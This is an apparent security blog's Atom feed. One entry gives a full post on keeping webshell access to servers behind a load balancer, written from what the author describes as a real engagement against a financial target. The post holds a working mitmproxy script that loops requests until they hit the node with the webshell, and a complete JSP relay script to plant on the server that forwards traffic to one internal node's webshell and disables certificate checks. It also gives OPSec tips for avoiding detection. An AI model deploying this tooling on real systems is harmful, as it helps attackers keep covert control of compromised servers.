<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Blog</title>
  
  <subtitle>maoblog</subtitle>
  <link href="https://cyxsec.github.io/atom.xml" rel="self"/>
  
  <link href="https://cyxsec.github.io/"/>
  <updated>2024-09-19T02:08:30.719Z</updated>
  <id>https://cyxsec.github.io/</id>
  
  <author>
    <name>John Doe</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>java代码审计-框架结构梳理篇</title>
    <link href="https://cyxsec.github.io/2024/08/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-%E6%A1%86%E6%9E%B6%E7%BB%93%E6%9E%84%E6%A2%B3%E7%90%86%E7%AF%87/"/>
    <id>https://cyxsec.github.io/2024/08/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-%E6%A1%86%E6%9E%B6%E7%BB%93%E6%9E%84%E6%A2%B3%E7%90%86%E7%AF%87/</id>
    <published>2024-08-27T07:53:29.000Z</published>
    <updated>2024-09-19T02:08:30.719Z</updated>
    
    
    
    
    
  </entry>
  
  <entry>
    <title>SSRF攻防指北</title>
    <link href="https://cyxsec.github.io/2024/08/SSRF%E6%94%BB%E9%98%B2%E6%8C%87%E5%8C%97/"/>
    <id>https://cyxsec.github.io/2024/08/SSRF%E6%94%BB%E9%98%B2%E6%8C%87%E5%8C%97/</id>
    <published>2024-08-16T08:08:39.000Z</published>
    <updated>2024-09-19T02:08:30.721Z</updated>
    
    
    
    
    
  </entry>
  
  <entry>
    <title>SQL注入过滤字符渗透指北</title>
    <link href="https://cyxsec.github.io/2024/07/SQL%E6%B3%A8%E5%85%A5%E8%BF%87%E6%BB%A4%E5%AD%97%E7%AC%A6%E6%B8%97%E9%80%8F%E6%8C%87%E5%8C%97/"/>
    <id>https://cyxsec.github.io/2024/07/SQL%E6%B3%A8%E5%85%A5%E8%BF%87%E6%BB%A4%E5%AD%97%E7%AC%A6%E6%B8%97%E9%80%8F%E6%8C%87%E5%8C%97/</id>
    <published>2024-07-23T08:40:55.000Z</published>
    <updated>2024-09-19T02:08:30.720Z</updated>
    
    
    
    
    
  </entry>
  
  <entry>
    <title>负载均衡下的Webshell连接</title>
    <link href="https://cyxsec.github.io/2023/10/%E8%B4%9F%E8%BD%BD%E5%9D%87%E8%A1%A1%E4%B8%8B%E7%9A%84Webshell%E8%BF%9E%E6%8E%A5/"/>
    <id>https://cyxsec.github.io/2023/10/%E8%B4%9F%E8%BD%BD%E5%9D%87%E8%A1%A1%E4%B8%8B%E7%9A%84Webshell%E8%BF%9E%E6%8E%A5/</id>
    <published>2023-10-22T05:51:39.000Z</published>
    <updated>2024-07-22T08:47:53.102Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x00-序"><a class="markdownIt-Anchor" href="#0x00-序"></a> 0x00 序</h1><p>最近打金融项目的时候，webshell遇见了负载均衡，自己之前其实看过相关文章，但是实战操作起来还是遇见了不少坑点的，接下来就根据前人的文章，同时结合实战和自己的思考，写了本篇文章。</p><h1 id="0x01-什么是负载均衡"><a class="markdownIt-Anchor" href="#0x01-什么是负载均衡"></a> 0x01 什么是负载均衡</h1><p>负载均衡是一种将来自多个用户或应用程序的请求分配到多个服务器或设备上的技术，以提高整体性能、可用性和可扩展性。它就像交通管制员，可以将流量分散到不同的道路上，避免任何一条道路堵塞。</p><p>在互联网应用中，负载均衡通常用于将来自用户的请求分发到多台 Web 服务器。这可以提高网站的性能和响应速度，并确保即使在高流量情况下也能保持正常运行。此外，负载均衡还可以提高应用程序的可用性，如果一台服务器出现故障，其他服务器可以继续处理请求而不会中断服务。</p><p>拿常见nginx实现LBS来说：</p><p><img src="../../../typora-user-images/image-20240722143117448.png" alt="image-20240722143117448" /></p><p>简单总结就是：我们访问的webshell是通过nginx转发过去的，webshell的实际处理，nginx会默认对负载节点进行轮询请求，也就是我们访问webshell可能一会在node1，一会在node2。</p><p>那么分辨是否采用了这种技术也很简单：</p><ol><li>我们使用webshell执行命令，发现查询到的内网ip一直在变化</li><li>我们查看目录文件时，发现刷新一次，目录就发生变化了</li></ol><h2 id="负载均衡的问题在哪里"><a class="markdownIt-Anchor" href="#负载均衡的问题在哪里"></a> 负载均衡的问题在哪里？</h2><p>根据我们上面的介绍，我们的webshell请求会随机请求到内部未知的node点。</p><p>在如下的webshell场景中</p><ol><li>我们上传文件使用的是将文件分块写入（中间件会限制data大小，大文件必须分块），因为是不同的node节点处理，文件分块也就导致，file_piece1写入到了node1节点，file_piece2写入到了node2节点。无法落地大文件。</li></ol><h1 id="0x02-未做文件同步的负载均衡"><a class="markdownIt-Anchor" href="#0x02-未做文件同步的负载均衡"></a> 0x02 未做文件同步的负载均衡</h1><p>这也是本次自己实战中遇到的情况， 未做文件同步，也就是我们上传webshell，请求处理后只落地在了其中的某一个node节点。</p><p>这也就导致，请求一会200（轮询到了落地webshell的node节点），一会404（未轮询到落地webshell的node节点）。</p><h2 id="mitmproxy循环请求"><a class="markdownIt-Anchor" href="#mitmproxy循环请求"></a> mitmproxy循环请求</h2><p>当时想的第一种简便易行的方式就是写脚本、循环判断，当前请求为404时就循环请求，直到请求方式为200，也就是说，我们保证了所有的请求都到了落地webshell的node节点，也能保证大文件的上传</p><p>demo:</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> mitmproxy <span class="token keyword">import</span> ctx<span class="token punctuation">,</span> http<span class="token keyword">import</span> requests<span class="token keyword">class</span> <span class="token class-name">ProxyAddon</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">request</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> flow<span class="token punctuation">:</span> http<span class="token punctuation">.</span>HTTPFlow<span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token boolean">None</span><span class="token punctuation">:</span>        <span class="token comment"># 只处理POST请求</span>        <span class="token keyword">if</span> flow<span class="token punctuation">.</span>request<span class="token punctuation">.</span>method <span class="token operator">==</span> <span class="token string">"POST"</span><span class="token punctuation">:</span>            url <span class="token operator">=</span> self<span class="token punctuation">.</span>get_https_url<span class="token punctuation">(</span>flow<span class="token punctuation">.</span>request<span class="token punctuation">.</span>host<span class="token punctuation">,</span> flow<span class="token punctuation">.</span>request<span class="token punctuation">.</span>path<span class="token punctuation">)</span>            <span class="token comment"># 打印转发前的请求内容</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Original Request:"</span><span class="token punctuation">)</span>            <span class="token keyword">print</span><span class="token punctuation">(</span>flow<span class="token punctuation">.</span>request<span class="token punctuation">.</span>headers<span class="token punctuation">)</span>            <span class="token keyword">print</span><span class="token punctuation">(</span>flow<span class="token punctuation">.</span>request<span class="token punctuation">.</span>content<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>            <span class="token comment"># 发送POST请求到目标HTTPS服务器</span>            <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>                <span class="token keyword">try</span><span class="token punctuation">:</span>                    response <span class="token operator">=</span> self<span class="token punctuation">.</span>make_https_request<span class="token punctuation">(</span>url<span class="token punctuation">,</span> flow<span class="token punctuation">.</span>request<span class="token punctuation">.</span>content<span class="token punctuation">)</span>                    <span class="token keyword">break</span>                <span class="token keyword">except</span><span class="token punctuation">:</span>                    <span class="token keyword">continue</span>            <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>                <span class="token keyword">try</span><span class="token punctuation">:</span>                    response <span class="token operator">=</span> self<span class="token punctuation">.</span>make_https_request<span class="token punctuation">(</span>url<span class="token punctuation">,</span> flow<span class="token punctuation">.</span>request<span class="token punctuation">.</span>content<span class="token punctuation">)</span>                    <span class="token keyword">if</span><span class="token punctuation">(</span>response<span class="token punctuation">.</span>status_code <span class="token operator">!=</span> <span class="token number">404</span><span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token keyword">break</span>                    <span class="token keyword">continue</span>                <span class="token keyword">except</span><span class="token punctuation">:</span>                    <span class="token keyword">continue</span>                                <span class="token comment"># 打印转发后的响应内容</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Forwarded Response:"</span><span class="token punctuation">)</span>            <span class="token keyword">print</span><span class="token punctuation">(</span>response<span class="token punctuation">.</span>headers<span class="token punctuation">)</span>            <span class="token keyword">print</span><span class="token punctuation">(</span>response<span class="token punctuation">.</span>content<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>            <span class="token comment"># 将HTTPS响应返回给监听</span>            headers <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">(</span>k<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">,</span> v<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">for</span> k<span class="token punctuation">,</span> v <span class="token keyword">in</span> response<span class="token punctuation">.</span>headers<span class="token punctuation">.</span>items<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">]</span>            flow<span class="token punctuation">.</span>response <span class="token operator">=</span> http<span class="token punctuation">.</span>Response<span class="token punctuation">.</span>make<span class="token punctuation">(</span>                <span class="token number">200</span><span class="token punctuation">,</span>                response<span class="token punctuation">.</span>content<span class="token punctuation">,</span>                headers            <span class="token punctuation">)</span>    <span class="token keyword">def</span> <span class="token function">make_https_request</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> url<span class="token punctuation">,</span> data<span class="token punctuation">)</span><span class="token punctuation">:</span>        proxies <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">'http'</span><span class="token punctuation">:</span><span class="token string">'http://127.0.0.1:8080'</span><span class="token punctuation">,</span>                   <span class="token string">'https'</span><span class="token punctuation">:</span><span class="token string">'https://127.0.0.1:8080'</span><span class="token punctuation">&#125;</span>        <span class="token comment"># 自定义超时时间为10秒</span>        response <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span> data<span class="token operator">=</span>data<span class="token punctuation">,</span> timeout<span class="token operator">=</span><span class="token number">3</span><span class="token punctuation">,</span> proxies<span class="token operator">=</span>proxies<span class="token punctuation">,</span> verify<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> response    <span class="token keyword">def</span> <span class="token function">get_https_url</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> host<span class="token punctuation">,</span> path<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token comment"># 根据需要修改为相应的HTTPS地址</span>        https_host <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f"https://</span><span class="token interpolation"><span class="token punctuation">&#123;</span>host<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span>        <span class="token keyword">return</span> <span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">&#123;</span>https_host<span class="token punctuation">&#125;</span></span><span class="token interpolation"><span class="token punctuation">&#123;</span>path<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span>addons <span class="token operator">=</span> <span class="token punctuation">[</span>    ProxyAddon<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这个方式还有两个有意思的点需要说一下：</p><ol><li>需要设置webshell工具的超时时间，因为请求到mitmproxy的时候，404的请求会循环请求，直到响应为200时，响应数据才会转发给webshell客户端，运气不好的话，这个过程可能会持续很长时间，所以需要设置webshell工具的超时时间，直到可以正常接收数据和响应展示。</li><li>可以留意我上面的脚本，有一个http转https的 操作，这个是因为mitmproxy配置https截取数据非常麻烦，所以就想了这种方式，我当时目标的环境就是https，之后在webshell连接工具的url部分填http即可，请求的处理部分都在上面的py脚本里，这里的webshell客户端就充当构造原始请求和解码响应数据展示的功能</li></ol><h1 id="0x03-做了文件同步的负载均衡"><a class="markdownIt-Anchor" href="#0x03-做了文件同步的负载均衡"></a> 0x03 做了文件同步的负载均衡</h1><p>与上面的相对应，我们上传的文件会同步到所有的负载node节点</p><h2 id="增加http流量转发脚本统一转发内网单一node"><a class="markdownIt-Anchor" href="#增加http流量转发脚本统一转发内网单一node"></a> 增加HTTP流量转发脚本，统一转发内网单一node</h2><p>这是蚁剑作者medicean的思路</p><p>需要落地两个文件，一个是webshell，一个是流量转发脚本</p><p>直接做阅读理解：</p><p>单纯的http流量转发脚本</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token operator">&lt;</span><span class="token operator">%</span>@ page contentType<span class="token operator">=</span><span class="token string">"text/html;charset=UTF-8"</span> language<span class="token operator">=</span><span class="token string">"java"</span> <span class="token operator">%</span><span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">%</span>@ page <span class="token keyword">import</span><span class="token operator">=</span><span class="token string">"javax.net.ssl.*"</span> <span class="token operator">%</span><span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">%</span>@ page <span class="token keyword">import</span><span class="token operator">=</span><span class="token string">"java.io.ByteArrayOutputStream"</span> <span class="token operator">%</span><span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">%</span>@ page <span class="token keyword">import</span><span class="token operator">=</span><span class="token string">"java.io.DataInputStream"</span> <span class="token operator">%</span><span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">%</span>@ page <span class="token keyword">import</span><span class="token operator">=</span><span class="token string">"java.io.InputStream"</span> <span class="token operator">%</span><span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">%</span>@ page <span class="token keyword">import</span><span class="token operator">=</span><span class="token string">"java.io.OutputStream"</span> <span class="token operator">%</span><span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">%</span>@ page <span class="token keyword">import</span><span class="token operator">=</span><span class="token string">"java.net.HttpURLConnection"</span> <span class="token operator">%</span><span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">%</span>@ page <span class="token keyword">import</span><span class="token operator">=</span><span class="token string">"java.net.URL"</span> <span class="token operator">%</span><span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">%</span>@ page <span class="token keyword">import</span><span class="token operator">=</span><span class="token string">"java.security.KeyManagementException"</span> <span class="token operator">%</span><span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">%</span>@ page <span class="token keyword">import</span><span class="token operator">=</span><span class="token string">"java.security.NoSuchAlgorithmException"</span> <span class="token operator">%</span><span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">%</span>@ page <span class="token keyword">import</span><span class="token operator">=</span><span class="token string">"java.security.cert.CertificateException"</span> <span class="token operator">%</span><span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">%</span>@ page <span class="token keyword">import</span><span class="token operator">=</span><span class="token string">"java.security.cert.X509Certificate"</span> <span class="token operator">%</span><span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">%</span><span class="token operator">!</span>  <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">ignoreSsl</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">HostnameVerifier</span> hv <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HostnameVerifier</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">public</span> <span class="token keyword">boolean</span> <span class="token function">verify</span><span class="token punctuation">(</span><span class="token class-name">String</span> urlHostName<span class="token punctuation">,</span> <span class="token class-name">SSLSession</span> session<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span><span class="token punctuation">;</span>        <span class="token function">trustAllHttpsCertificates</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">HttpsURLConnection</span><span class="token punctuation">.</span><span class="token function">setDefaultHostnameVerifier</span><span class="token punctuation">(</span>hv<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">trustAllHttpsCertificates</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">TrustManager</span><span class="token punctuation">[</span><span class="token punctuation">]</span> trustAllCerts <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">TrustManager</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token punctuation">&#123;</span> <span class="token keyword">new</span> <span class="token class-name">X509TrustManager</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">public</span> <span class="token class-name">X509Certificate</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token function">getAcceptedIssuers</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                <span class="token keyword">return</span> <span class="token keyword">null</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>            <span class="token annotation punctuation">@Override</span>            <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">checkClientTrusted</span><span class="token punctuation">(</span><span class="token class-name">X509Certificate</span><span class="token punctuation">[</span><span class="token punctuation">]</span> arg0<span class="token punctuation">,</span> <span class="token class-name">String</span> arg1<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">CertificateException</span> <span class="token punctuation">&#123;</span>                <span class="token comment">// Not implemented</span>            <span class="token punctuation">&#125;</span>            <span class="token annotation punctuation">@Override</span>            <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">checkServerTrusted</span><span class="token punctuation">(</span><span class="token class-name">X509Certificate</span><span class="token punctuation">[</span><span class="token punctuation">]</span> arg0<span class="token punctuation">,</span> <span class="token class-name">String</span> arg1<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">CertificateException</span> <span class="token punctuation">&#123;</span>                <span class="token comment">// Not implemented</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span> <span class="token punctuation">&#125;</span><span class="token punctuation">;</span>        <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>            <span class="token class-name">SSLContext</span> sc <span class="token operator">=</span> <span class="token class-name">SSLContext</span><span class="token punctuation">.</span><span class="token function">getInstance</span><span class="token punctuation">(</span><span class="token string">"TLS"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            sc<span class="token punctuation">.</span><span class="token function">init</span><span class="token punctuation">(</span><span class="token keyword">null</span><span class="token punctuation">,</span> trustAllCerts<span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name"><span class="token namespace">java<span class="token punctuation">.</span>security<span class="token punctuation">.</span></span>SecureRandom</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token class-name">HttpsURLConnection</span><span class="token punctuation">.</span><span class="token function">setDefaultSSLSocketFactory</span><span class="token punctuation">(</span>sc<span class="token punctuation">.</span><span class="token function">getSocketFactory</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">KeyManagementException</span> e<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">NoSuchAlgorithmException</span> e<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token operator">%</span><span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">%</span>        <span class="token class-name">String</span> target <span class="token operator">=</span> <span class="token string">"http://172.24.0.2:8080/ant.jsp"</span><span class="token punctuation">;</span><span class="token comment">//填写内网node的webshell地址</span>        <span class="token class-name">URL</span> url <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">URL</span><span class="token punctuation">(</span>target<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token string">"https"</span><span class="token punctuation">.</span><span class="token function">equalsIgnoreCase</span><span class="token punctuation">(</span>url<span class="token punctuation">.</span><span class="token function">getProtocol</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token function">ignoreSsl</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token class-name">HttpURLConnection</span> conn <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">HttpURLConnection</span><span class="token punctuation">)</span>url<span class="token punctuation">.</span><span class="token function">openConnection</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">StringBuilder</span> sb <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">StringBuilder</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        conn<span class="token punctuation">.</span><span class="token function">setRequestMethod</span><span class="token punctuation">(</span>request<span class="token punctuation">.</span><span class="token function">getMethod</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        conn<span class="token punctuation">.</span><span class="token function">setConnectTimeout</span><span class="token punctuation">(</span><span class="token number">30000</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        conn<span class="token punctuation">.</span><span class="token function">setDoOutput</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        conn<span class="token punctuation">.</span><span class="token function">setDoInput</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        conn<span class="token punctuation">.</span><span class="token function">setInstanceFollowRedirects</span><span class="token punctuation">(</span><span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        conn<span class="token punctuation">.</span><span class="token function">connect</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">ByteArrayOutputStream</span> baos<span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">ByteArrayOutputStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">OutputStream</span> out2 <span class="token operator">=</span> conn<span class="token punctuation">.</span><span class="token function">getOutputStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">DataInputStream</span> in<span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">DataInputStream</span><span class="token punctuation">(</span>request<span class="token punctuation">.</span><span class="token function">getInputStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> buf <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token number">1024</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token keyword">int</span> len <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>        <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>len <span class="token operator">=</span> in<span class="token punctuation">.</span><span class="token function">read</span><span class="token punctuation">(</span>buf<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            baos<span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span>buf<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> len<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        baos<span class="token punctuation">.</span><span class="token function">flush</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        baos<span class="token punctuation">.</span><span class="token function">writeTo</span><span class="token punctuation">(</span>out2<span class="token punctuation">)</span><span class="token punctuation">;</span>        baos<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">InputStream</span> inputStream <span class="token operator">=</span> conn<span class="token punctuation">.</span><span class="token function">getInputStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">OutputStream</span> out3<span class="token operator">=</span>response<span class="token punctuation">.</span><span class="token function">getOutputStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">int</span> len2 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>        <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>len2 <span class="token operator">=</span> inputStream<span class="token punctuation">.</span><span class="token function">read</span><span class="token punctuation">(</span>buf<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            out3<span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span>buf<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> len2<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        out3<span class="token punctuation">.</span><span class="token function">flush</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        out3<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">%</span><span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="../../../typora-user-images/image-20240722154209730.png" alt="image-20240722154209730" /></p><p>过程如图：实际上就是webshell先请求转发的antproxy.jsp，无论这个脚本在哪个node，都会把请求包统一转发到指定的内网ip地址的node，也就保证了我们的请求都落在了一个node上。</p><h3 id="其他语言的转发脚本"><a class="markdownIt-Anchor" href="#其他语言的转发脚本"></a> 其他语言的转发脚本</h3><p>其他语言负载很少见，直接让GPT做吧</p><h3 id="必须要上传两个文件吗"><a class="markdownIt-Anchor" href="#必须要上传两个文件吗"></a> 必须要上传两个文件吗？</h3><p>可能有人觉得上传两个文件操作不够完美，但是无论如何，负载均衡的情况都是一定要至少上传两次的。</p><p>因为我们首先要上传脚本，来判断不同node的差异性，这个差异有可能是ip，也有可能是文件。</p><p>第二个上传的脚本才是根据差异性来保证所有请求都到某一个node。</p><h1 id="0x04-opsec下的思路"><a class="markdownIt-Anchor" href="#0x04-opsec下的思路"></a> 0x04 OPSec下的思路</h1><p>遵循OPSec，我们尽量不使用webshell直接执行命令获取ip和端口信息，如果是Linux的情况还好说，proc下面保存着进程的端口信息，net下面也保存着端口信息。非dhcp情况下也能从本地config读ip信息，读不到ip或者是windows就比较麻烦了。</p><p>无法获取node的ip信息，就只能寻找其他差异性了：</p><ol><li>可以通过上传的webshell刷新某一目录，查看文件是否不同来寻找差异性</li><li>通过webshell在某一node新建临时文件来手动创造差异性</li></ol><p>接下来就可以结合上面的未做文件同步的思路了：</p><p>确定差异性后，重新上传一个webshll，其中增加一个判断逻辑，判断条件就是我们上面提到的差异性，拿上面提到的第2点手动创造差异性来说：</p><p>if(操作系统不存在该临时文件){返回404}</p><p>再结合上面0x02的循环判断状态码的方式，也能在不执行系统命令的前提下完成负载webshell的连接。</p><p>参考链接：</p><p>（负载均衡下的 WebShell 连接）<a href="https://mp.weixin.qq.com/s/4Bmz_fuu0yrLMK1oBKKtRA">https://mp.weixin.qq.com/s/4Bmz_fuu0yrLMK1oBKKtRA</a></p>]]></content>
    
    
      
      
